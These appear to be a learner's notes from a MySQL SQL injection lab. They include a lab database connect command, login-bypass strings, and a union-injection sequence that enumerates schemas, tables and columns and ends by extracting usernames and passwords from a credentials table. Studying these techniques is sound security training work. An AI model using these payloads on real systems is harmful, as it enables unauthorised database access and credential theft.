Note: This module is focused in MySQL
mysql -u root -h 94.237.49.128 -P 53380 --ssl --ssl-verify-server-cert=0 -p

# SQL Injections
## Subverting Query Logic
```bash
tom' or '1'='1
```
## Using Comments
```bash
' or id = 5)-- 
```
## Using Comments
```bash
' or id = 5)-- 
```
# Union Injection
Find the numbers of columns
<img width="580" height="242" alt="image" src="https://github.com/user-attachments/assets/f49e9d3f-ed74-4a4f-be3b-11da01a80afb" />
Payload
```bash
# Gathering information
aaa' UNION SELECT 1,database(),user(),@@version-- -
# Databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
# Tables
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
# Columns
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
# Data
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
